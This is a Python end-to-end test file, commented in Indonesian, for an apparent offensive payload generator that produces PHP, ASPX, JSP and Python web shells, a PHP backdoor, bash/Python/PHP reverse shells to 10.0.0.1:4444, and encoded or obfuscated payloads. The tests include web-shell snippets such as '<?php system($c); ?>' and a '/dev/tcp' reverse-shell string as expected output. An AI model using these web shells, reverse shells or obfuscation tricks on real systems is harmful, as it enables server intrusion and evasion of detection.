#!/usr/bin/env python3
"""E2E tests untuk payload-generator."""
import subprocess, sys, os

KIT_DIR = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(KIT_DIR, "payload_gen.py")

def run(*args):
    r = subprocess.run([sys.executable, SCRIPT, *args], capture_output=True, text=True)
    return r.returncode, r.stdout, r.stderr

def test_php_command():
    rc, out, _ = run("php", "--method", "command", "--param", "c")
    assert rc == 0
    assert "system" in out
    assert "$c" in out or "$_" in out
    print("[PASS] php command")

def test_php_eval():
    rc, out, _ = run("php", "--method", "eval")
    assert rc == 0
    assert "eval" in out
    print("[PASS] php eval")

def test_php_backdoor():
    rc, out, _ = run("php", "--method", "backdoor")
    assert rc == 0
    assert "system" in out
    print("[PASS] php backdoor")

def test_aspx_command():
    rc, out, _ = run("aspx", "--method", "command")
    assert rc == 0
    assert "Process" in out
    print("[PASS] aspx command")

def test_jsp_command():
    rc, out, _ = run("jsp", "--method", "command")
    assert rc == 0
    assert "Runtime" in out
    print("[PASS] jsp command")

def test_python_command():
    rc, out, _ = run("python", "--method", "command")
    assert rc == 0
    assert "os.system" in out
    print("[PASS] python command")

def test_reverse_bash():
    rc, out, _ = run("reverse", "--type", "bash", "--ip", "10.0.0.1", "--port", "4444")
    assert rc == 0
    assert "/dev/tcp/10.0.0.1/4444" in out
    print("[PASS] reverse bash")

def test_reverse_python():
    rc, out, _ = run("reverse", "--type", "python", "--ip", "10.0.0.1", "--port", "4444")
    assert rc == 0
    assert "socket" in out
    print("[PASS] reverse python")

def test_reverse_php():
    rc, out, _ = run("reverse", "--type", "php", "--ip", "10.0.0.1", "--port", "4444")
    assert rc == 0
    assert "fsockopen" in out
    print("[PASS] reverse php")

def test_encode_base64():
    rc, out, _ = run("encode", "--payload", "hello", "--method", "base64")
    assert rc == 0
    assert "aGVsbG8=" in out
    print("[PASS] encode base64")

def test_encode_hex():
    rc, out, _ = run("encode", "--payload", "hello", "--method", "hex")
    assert rc == 0
    assert "68656c6c6f" in out
    print("[PASS] encode hex")

def test_encode_url():
    rc, out, _ = run("encode", "--payload", "hello", "--method", "url")
    assert rc == 0
    assert "%68%65%6c%6c%6f" in out
    print("[PASS] encode url")

def test_obfuscate_comment():
    rc, out, _ = run("obfuscate", "--payload", "<?php system($c); ?>", "--method", "comment")
    assert rc == 0
    assert "/*" in out
    print("[PASS] obfuscate comment")

def test_obfuscate_case():
    rc, out, _ = run("obfuscate", "--payload", "EVAL", "--method", "case")
    assert rc == 0
    assert out != "EVAL"  # Should be mixed case
    print("[PASS] obfuscate case")

def test_obfuscate_variable():
    rc, out, _ = run("obfuscate", "--payload", '<?php $c=$_GET["c"]; eval($c); ?>', "--method", "variable")
    assert rc == 0
    assert "$c" not in out or "$$" in out  # Variables renamed
    print("[PASS] obfuscate variable")

if __name__ == "__main__":
    test_php_command()
    test_php_eval()
    test_php_backdoor()
    test_aspx_command()
    test_jsp_command()
    test_python_command()
    test_reverse_bash()
    test_reverse_python()
    test_reverse_php()
    test_encode_base64()
    test_encode_hex()
    test_encode_url()
    test_obfuscate_comment()
    test_obfuscate_case()
    test_obfuscate_variable()
    print("\n=== SEMUA TEST LULUS (15/15) ===")
